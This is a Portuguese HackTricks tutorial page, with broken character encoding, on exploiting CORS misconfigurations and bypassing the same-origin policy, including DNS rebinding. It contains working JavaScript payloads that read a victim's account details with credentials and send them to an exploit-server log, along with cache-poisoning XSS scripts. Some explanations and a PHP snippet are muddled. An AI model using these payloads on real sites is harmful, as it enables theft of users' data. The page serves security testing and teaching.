# CORS - Configura√ß√µes Incorretas & Bypass

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que √© CORS?

O padr√£o CORS (Cross-origin resource sharing) √© necess√°rio porque ele **permite que servidores especifiquem quem pode acessar seus ativos** e quais **m√©todos de requisi√ß√£o HTTP s√£o permitidos** a partir de recursos externos.

Uma pol√≠tica de **mesma origem** requer que tanto o **servidor solicitante** de um recurso quanto o servidor onde o **recurso** est√° localizado usem o mesmo protocolo ([http://), nome de dom√≠nio](http://\), nome de dom√≠nio) (internal-web.com) e a mesma **porta** (80). Ent√£o, se o servidor imp√µe a pol√≠tica de mesma origem, apenas p√°ginas web do mesmo dom√≠nio e porta poder√£o acessar os recursos.

A tabela a seguir mostra como a pol√≠tica de mesma origem seria aplicada em `http://normal-website.com/example/example.html` :

| URL acessada                              | Acesso permitido?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Sim: mesmo esquema, dom√≠nio e porta|
| `http://normal-website.com/example2/`     | Sim: mesmo esquema, dom√≠nio e porta|
| `https://normal-website.com/example/`     | N√£o: esquema e porta diferentes    |
| `http://en.normal-website.com/example/`   | N√£o: dom√≠nio diferente             |
| `http://www.normal-website.com/example/`  | N√£o: dom√≠nio diferente             |
| `http://normal-website.com:8080/example/` | N√£o: porta diferente\*             |

\*_O Internet Explorer permitir√° este acesso porque o IE n√£o leva em conta o n√∫mero da porta ao aplicar a pol√≠tica de mesma origem._

### Cabe√ßalho `Access-Control-Allow-Origin`

A especifica√ß√£o de `Access-Control-Allow-Origin` permite **m√∫ltiplas origens**, ou o valor **`null`**, ou o coringa **`*`**. No entanto, **nenhum navegador suporta m√∫ltiplas origens** e existem **restri√ß√µes** no uso do coringa **`*`**.(_O coringa s√≥ pode ser usado sozinho, isso falhar√° `Access-Control-Allow-Origin: https://*.normal-website.com` e n√£o pode ser usado com_ _Access-Control-Allow-Credentials: true_)

Este cabe√ßalho √© **retornado por um servidor** quando um site solicita um recurso de dom√≠nio cruzado, com um cabe√ßalho `Origin` adicionado pelo navegador.

### Cabe√ßalho `Access-Control-Allow-Credentials`

O comportamento **padr√£o** de requisi√ß√µes de recursos de origem cruzada √© para que as **requisi√ß√µes** sejam **passadas sem credenciais** como cookies e o cabe√ßalho de Autoriza√ß√£o. No entanto, o servidor de dom√≠nio cruzado pode **permitir a leitura** da **resposta** quando **credenciais** s√£o **passadas** para ele, definindo o cabe√ßalho CORS **`Access-Control-Allow-Credentials`** como **`true`**.

Se o valor for definido como `true`, ent√£o o navegador enviar√° credenciais (cookies, cabe√ßalhos de autoriza√ß√£o ou certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Pedido de pr√©-voo

Sob certas circunst√¢ncias, quando um pedido entre dom√≠nios:

* inclui um **m√©todo HTTP n√£o padr√£o (HEAD, GET, POST)**
* inclui novos **cabe√ßalhos**
* inclui um valor especial no cabe√ßalho **Content-Type**

{% hint style="info" %}
**Verifique** [**neste link**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **as condi√ß√µes de um pedido para evitar o envio de um pedido de pr√©-voo**
{% endhint %}

o pedido entre origens √© precedido por um **pedido** usando o m√©todo **`OPTIONS`**, e o protocolo CORS exige uma verifica√ß√£o inicial sobre quais **m√©todos e cabe√ßalhos s√£o permitidos antes de permitir o pedido entre origens**. Isso √© chamado de **verifica√ß√£o de pr√©-voo**. O servidor **retorna uma lista de m√©todos permitidos** al√©m da **origem confi√°vel** e o navegador verifica se o m√©todo do site solicitante √© permitido.

{% hint style="danger" %}
Note que **mesmo que um pedido de pr√©-voo n√£o seja enviado** porque as condi√ß√µes do "pedido regular" s√£o respeitadas, a **resposta precisa ter os cabe√ßalhos de autoriza√ß√£o** ou o **navegador** **n√£o poder√° ler a resposta** do pedido.
{% endhint %}

Por **exemplo**, este √© um pedido de pr√©-voo que est√° tentando **usar o m√©todo `PUT`** juntamente com um **cabe√ßalho** de pedido **personalizado** chamado `Special-Request-Header`:
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
O servidor pode retornar uma resposta como a seguinte:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` Cabe√ßalhos permitidos
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` Define um tempo m√°ximo para o cache da resposta de pr√©-voo para reutiliza√ß√£o
* `Access-Control-Request-Headers` O cabe√ßalho que a solicita√ß√£o de origem cruzada deseja enviar
* `Access-Control-Request-Method` O m√©todo que a solicita√ß√£o de origem cruzada deseja usar
* `Origin` Origem da solicita√ß√£o de origem cruzada (Definido automaticamente pelo navegador)

![](../.gitbook/assets/preflight.svg)

Note que normalmente (dependendo do content-type e dos cabe√ßalhos definidos) em uma **solicita√ß√£o GET/POST n√£o √© enviada uma solicita√ß√£o de pr√©-voo** (a solicita√ß√£o √© enviada **diretamente**), mas se voc√™ quiser acessar os **cabe√ßalhos/corpo da resposta**, ela deve conter um cabe√ßalho _Access-Control-Allow-Origin_ permitindo isso.\
**Portanto, CORS n√£o protege contra CSRF (mas pode ser √∫til).**

### **Solicita√ß√£o de pr√©-voo de pedidos de rede local**

Quando uma solicita√ß√£o √© enviada para um endere√ßo IP de rede local, 2 cabe√ßalhos CORS adicionais s√£o enviados:

* O cabe√ßalho de solicita√ß√£o do cliente `Access-Control-Request-Local-Network` indica que a solicita√ß√£o √© um pedido de rede local
* O cabe√ßalho de resposta do servidor `Access-Control-Allow-Local-Network` indica que um recurso pode ser compartilhado com seguran√ßa com redes externas

Uma **resposta v√°lida que permite a solicita√ß√£o de rede local** precisa ter tamb√©m na resposta o cabe√ßalho `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Observe que o IP **0.0.0.0** do linux funciona para **bypass** desses requisitos para acessar o localhost, pois esse endere√ßo IP n√£o √© considerado "local".

Tamb√©m √© poss√≠vel **bypass nos requisitos de Rede Local** se voc√™ usar o **endere√ßo IP p√∫blico de um ponto final local** (como o IP p√∫blico do roteador). Porque em v√°rias ocasi√µes, mesmo que o **IP p√∫blico** esteja sendo acessado, se for **da rede local**, o acesso ser√° concedido.


{% endhint %}

## Configura√ß√µes mal configuradas explor√°veis

Note que a maioria dos **ataques reais requerem `Access-Control-Allow-Credentials`** definido como **`true`**, pois isso permitir√° que o navegador envie as credenciais e leia a resposta. Sem credenciais, muitos ataques se tornam irrelevantes; significa que voc√™ n√£o pode aproveitar os cookies de um usu√°rio, ent√£o muitas vezes n√£o h√° nada a ganhar fazendo o navegador deles emitir a solicita√ß√£o em vez de faz√™-la voc√™ mesmo.

Uma exce√ß√£o not√°vel √© quando a **localiza√ß√£o de rede da v√≠tima funciona como um tipo de autentica√ß√£o.** Voc√™ pode usar o navegador de uma v√≠tima como um proxy para bypass na autentica√ß√£o baseada em IP e acessar aplica√ß√µes de intranet. Em termos de impacto, isso √© semelhante ao DNS rebinding, mas muito menos complicado de explorar.

### `Origin` refletido em `Access-Control-Allow-Origin`

No mundo real isso n√£o pode acontecer, pois **esses 2 valores dos cabe√ßalhos s√£o proibidos juntos**.\
Tamb√©m √© verdade que muitos desenvolvedores querem **permitir v√°rias URLs no CORS**, mas curingas de subdom√≠nio ou listas de URLs n√£o s√£o permitidos. Ent√£o, v√°rios desenvolvedores **geram** o cabe√ßalho \*\*`Access-Control-Allow-Origin`\*\* **dinamicamente**, e em mais de uma ocasi√£o eles simplesmente **copiam o valor do cabe√ßalho Origin**.

Nesse caso, a **mesma vulnerabilidade pode ser explorada.**

Em outros casos, o desenvolvedor pode verificar se o **dom√≠nio** (_victimdomain.com_) **aparece** no cabe√ßalho **Origin**, ent√£o, um atacante pode usar um dom√≠nio chamado **`attackervictimdomain.com`** para roubar as informa√ß√µes confidenciais.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### A Origem `null`

`null` √© um valor especial para o cabe√ßalho **Origin**. A especifica√ß√£o menciona que ele √© acionado por redirecionamentos e arquivos HTML locais. Algumas aplica√ß√µes podem incluir na lista branca a origem `null` para suportar o desenvolvimento local da aplica√ß√£o.\
Isso √© bom porque **v√°rias aplica√ß√µes permitir√£o esse valor** dentro do CORS e qualquer **site pode facilmente obter a origem null usando um iframe com sandbox**:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Bypasses de Regexp**

Se voc√™ descobriu que o dom√≠nio _victim.com_ est√° na **lista de permiss√µes**, voc√™ deve verificar se _victim.com.**attacker.com**_ tamb√©m est√° **na lista de permiss√µes**, ou, caso voc√™ possa **tomar controle de algum subdom√≠nio**, verifique se _**somesubdomain**.victim.com_ est√° na lista de permiss√µes.

### **Bypasses avan√ßados de Regexp**

A maioria dos regex usados para identificar o dom√≠nio dentro da string se concentra em caracteres ASCII alfanum√©ricos e `.-`. Ent√£o, algo como `victimdomain.com{.attacker.com` no cabe√ßalho Origin ser√° interpretado pelo regexp como se o dom√≠nio fosse `victimdomain.com`, mas o navegador (neste caso, o Safari suporta este caractere no dom√≠nio) acessar√° o dom√≠nio `attacker.com`.

O caractere `_` (em subdom√≠nios) n√£o √© apenas suportado no Safari, mas tamb√©m no Chrome e no Firefox!

**Ent√£o, usando um desses subdom√≠nios, voc√™ poderia burlar alguns regex "comuns" para encontrar o dom√≠nio principal de uma URL.**

**Para mais informa√ß√µes e configura√ß√µes deste bypass, confira:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **e** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### De XSS dentro de um subdom√≠nio

Um mecanismo de defesa que os desenvolvedores usam contra a explora√ß√£o de CORS √© colocar na lista de permiss√µes dom√≠nios que frequentemente solicitam acesso a informa√ß√µes. No entanto, isso n√£o √© totalmente seguro, porque se at√© mesmo **um** dos subdom√≠nios do dom√≠nio **na lista de permiss√µes** for **vulner√°vel** a outros exploits, como **XSS**, isso pode possibilitar a explora√ß√£o de CORS.

Vamos considerar um exemplo, o seguinte c√≥digo mostra a configura√ß√£o que permite que subdom√≠nios de _requester.com_ acessem recursos de _provider.com_.
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
### **Envenenamento de cache do lado do servidor**

Se as estrelas estiverem alinhadas, podemos ser capazes de usar envenenamento de cache do lado do servidor via inje√ß√£o de cabe√ßalho HTTP para criar uma vulnerabilidade de [XSS armazenado](https://portswigger.net/web-security/cross-site-scripting/stored).

Se uma aplica√ß√£o **reflete** o cabe√ßalho **Origin** sem sequer verificar a presen√ßa de caracteres ilegais como , efetivamente temos uma **vulnerabilidade de inje√ß√£o de cabe√ßalho HTTP contra usu√°rios do IE/Edge, pois o Internet Explorer e o Edge consideram \r (0x0d) como um terminador de cabe√ßalho HTTP v√°lido**:`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

O Internet Explorer v√™ a resposta como:

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

Isso n√£o √© diretamente explor√°vel porque n√£o h√° como um atacante fazer com que o navegador web de algu√©m envie um cabe√ßalho t√£o malformado, mas eu posso **criar manualmente esta solicita√ß√£o no Burp Suite e um cache do lado do servidor pode salvar a resposta e servi-la a outras pessoas**. O payload que usei mudar√° o conjunto de caracteres da p√°gina para **UTF-7**, que √© notoriamente √∫til para criar vulnerabilidades XSS.

### **Envenenamento de cache do lado do cliente**

Voc√™ pode ter ocasionalmente encontrado uma p√°gina com [XSS refletido](https://portswigger.net/web-security/cross-site-scripting/reflected) em um cabe√ßalho HTTP personalizado. Digamos que uma p√°gina web reflita o conte√∫do de um cabe√ßalho personalizado sem codifica√ß√£o:
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
Com CORS, podemos enviar qualquer valor no Header. Por si s√≥, **isso √© in√∫til** j√° que a resposta contendo nosso **JavaScript injetado n√£o ser√° renderizado**. No entanto, **se Vary: Origin n√£o foi especificado** a resposta **pode ser armazenada no cache do navegador e exibida diretamente quando o navegador navega para a URL associada**. Eu criei um fiddle para [tentar esse ataque em uma URL de sua escolha](https://jsfiddle.net/3gk8u8wu/3/). Como esse ataque usa o cache do lado do cliente, ele √© na verdade bastante confi√°vel.
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI designa um tipo de vulnerabilidade que explora o fato de que, quando um recurso √© inclu√≠do usando a tag `script`, a SOP n√£o se aplica, porque os scripts precisam poder ser inclu√≠dos entre dom√≠nios. Um atacante pode, portanto, ler tudo o que foi inclu√≠do usando a tag `script`.

Isso √© especialmente interessante quando se trata de JavaScript din√¢mico ou JSONP, quando informa√ß√µes de autoridade ambiente como cookies s√£o usadas para autentica√ß√£o. Os cookies s√£o inclu√≠dos ao solicitar um recurso de um host diferente. Plugin do BurpSuite: [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**Leia mais sobre os diferentes tipos de XSSI e como explor√°-los aqui.**](xssi-cross-site-script-inclusion.md)

Tente adicionar um **par√¢metro `callback`** na solicita√ß√£o. Talvez a p√°gina tenha sido preparada para enviar os dados como JSONP. Nesse caso, a p√°gina enviar√° de volta os dados com `Content-Type: application/javascript`, o que contornar√° a pol√≠tica de CORS.

![](<../.gitbook/assets/image (229).png>)

### Bypass f√°cil (in√∫til?)

Voc√™ pode pedir a uma aplica√ß√£o web para fazer uma solicita√ß√£o por voc√™ e enviar de volta a resposta. Isso contornar√° o **`Access-Control-Allow-Origin`**, mas observe que as **credenciais para a v√≠tima final n√£o ser√£o enviadas**, pois voc√™ estar√° **contatando um dom√≠nio diferente** (aquele que far√° a solicita√ß√£o por voc√™).

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape fornece um **proxy** que **passa** a nossa **solicita√ß√£o** junto com seus **headers**, e tamb√©m **falsifica** o header **Origin** (Origin = **dom√≠nio solicitado**). Assim, a **pol√≠tica de CORS √© contornada**.\
O c√≥digo-fonte est√° [no Github](https://github.com/shalvah/cors-escape), ent√£o voc√™ pode **hospedar o seu pr√≥prio**.
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

Proxying √© como se fosse "passar adiante" sua solicita√ß√£o, exatamente como voc√™ a enviou. Poder√≠amos resolver isso de uma maneira alternativa que ainda envolve algu√©m fazendo a solicita√ß√£o por voc√™, mas desta vez, **em vez de passar adiante sua solicita√ß√£o, o servidor faz sua pr√≥pria solicita√ß√£o, mas com quaisquer par√¢metros que voc√™ especificou.**

### Iframe + Popup Bypass

Voc√™ pode **burlar verifica√ß√µes de CORS** como `e.origin === window.origin` **criando um iframe** e **a partir dele abrindo uma nova janela**. Mais informa√ß√µes na p√°gina a seguir:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

Basicamente voc√™ faz o **usu√°rio acessar sua p√°gina**, depois voc√™ muda o **DNS do seu dom√≠nio (o IP)** e faz com que ele **aponte** para a **p√°gina web da v√≠tima**. Voc√™ faz sua **v√≠tima executar** (**JS**) algo quando o **TTL terminar** para que uma nova solicita√ß√£o de DNS seja feita e ent√£o voc√™ poder√° coletar as informa√ß√µes (como voc√™ sempre mant√©m **o usu√°rio em seu dom√≠nio**, ele n√£o enviar√° **nenhum cookie** para o servidor da v√≠tima, ent√£o esta op√ß√£o **abusa dos privil√©gios especiais do IP da v√≠tima**).

Mesmo que voc√™ defina o **TTL muito baixo** (0 ou 1), os **navegadores t√™m um cache** que ir√° **impedir** que voc√™ **abuse** disso por v√°rios segundos/minutos.

Portanto, essa t√©cnica √© √∫til para **burlar verifica√ß√µes expl√≠citas** (a v√≠tima est√° **realizando explicitamente uma solicita√ß√£o de DNS** para verificar o IP do dom√≠nio e quando o bot √© chamado ele far√° sua pr√≥pria).

Ou quando voc√™ pode ter um **usu√°rio/bot na mesma p√°gina por um longo tempo** (para que voc√™ possa **esperar** at√© que o **cache expire**).

Se voc√™ precisar de algo r√°pido para abusar disso, voc√™ pode usar um servi√ßo como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Se voc√™ quiser executar seu pr√≥prio servidor de DNS rebinding, voc√™ pode usar algo como [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** depois **exponha** sua **porta local 53/udp**, crie um **registro A apontando para ele** (ns.example.com), e crie um **registro NS** apontando para o **subdom√≠nio A criado anteriormente**(ns.example.com).\
Ent√£o, qualquer subdom√≠nio desse subdom√≠nio (ns.example.com), ser√° resolvido pelo seu host.

Confira tamb√©m o **servidor p√∫blico em execu√ß√£o em** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

### DNS Rebinding via **Inunda√ß√£o do Cache de DNS**

Como foi explicado na se√ß√£o anterior, os **navegadores** t√™m os IPs dos dom√≠nios **em cache por mais tempo** do que o especificado no TTL. No entanto, h√° uma maneira de contornar essa defesa.

Voc√™ pode ter um service worker que ir√° **inundar o cache de DNS para for√ßar uma segunda solicita√ß√£o de DNS**. Ent√£o o fluxo ser√° como:

1. Solicita√ß√£o de DNS respondida com endere√ßo do atacante
2. Service worker inunda o cache de DNS (o nome do servidor atacante em cache √© deletado)
3. Segunda solicita√ß√£o de DNS desta vez respondida com 127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_Azul √© a primeira solicita√ß√£o de DNS e laranja √© a inunda√ß√£o._

### DNS Rebinding via **Cache**

Como foi explicado na se√ß√£o anterior, os **navegadores** t√™m os IPs dos dom√≠nios **em cache por mais tempo** do que o especificado no TTL. No entanto, h√° outra maneira de contornar essa defesa.

Voc√™ pode **criar 2 registros A** (ou **1 com 2 IPs**, dependendo do provedor) para o **mesmo subdom√≠nio** no **provedor de DNS** e quando um navegador verificar por eles, ele receber√° ambos.

Agora, se o **navegador** decidir **usar primeiro o endere√ßo IP do atacante**, o **atacante** poder√° **servir** o **payload** que ir√° **realizar solicita√ß√µes HTTP** para o mesmo **dom√≠nio**. No entanto, agora que o atacante conhece o IP da v√≠tima, **ele parar√° de responder ao navegador da v√≠tima**.

Quando o navegador perceber que o **dom√≠nio n√£o est√° respondendo**, ele **usar√° o segundo IP fornecido**, ent√£o ele **acessar√° um local diferente burlando SOP**. O atacante pode abusar disso para **obter as informa√ß√µes e exfiltr√°-las**.

{% hint style="warning" %}
Observe que para acessar localhost voc√™ deve tentar reassociar **127.0.0.1** no Windows e **0.0.0.0** no linux.\
Provedores como godaddy ou cloudflare n√£o me permitiram usar o ip 0.0.0.0, mas a AWS route53 me permitiu criar um registro A com 2 IPs sendo um deles "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

Para mais informa√ß√µes, voc√™ pode conferir [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Outros Bypasses Comuns

* Se **IPs internos n√£o s√£o permitidos**, eles podem **ter esquecido de proibir 0.0.0.0** (funciona no Linux e Mac)
* Se **IPs internos n√£o s√£o permitidos**, responda com um **CNAME** para **localhost** (funciona no Linux e Mac)
* Se **IPs internos n√£o s√£o permitidos** como respostas de DNS, voc√™ pode responder com **CNAMEs para servi√ßos internos** como www.corporate.internal.

### DNS Rebidding Armado

Voc√™ pode encontrar mais informa√ß√µes sobre as t√©cnicas de bypass anteriores e como usar a seguinte ferramenta na palestra [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) √© uma ferramenta para realizar ataques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Inclui os componentes necess√°rios para reassociar o endere√ßo IP do nome DNS do servidor de ataque ao endere√ßo IP da m√°quina alvo e para servir payloads de ataque para explorar software vulner√°vel na m√°quina alvo.

### Prote√ß√£o Real contra DNS Rebinding

* Use TLS em servi√ßos internos
* Solicite autentica√ß√£o para acessar dados
* Valide o cabe√ßalho Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Proposta para sempre enviar uma solicita√ß√£o de pr√©-voo quando servidores p√∫blicos querem acessar servidores internos

## **Ferramentas**

**Fuzz poss√≠veis m√° configura√ß√µes em pol√≠ticas de CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Refer√™ncias

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
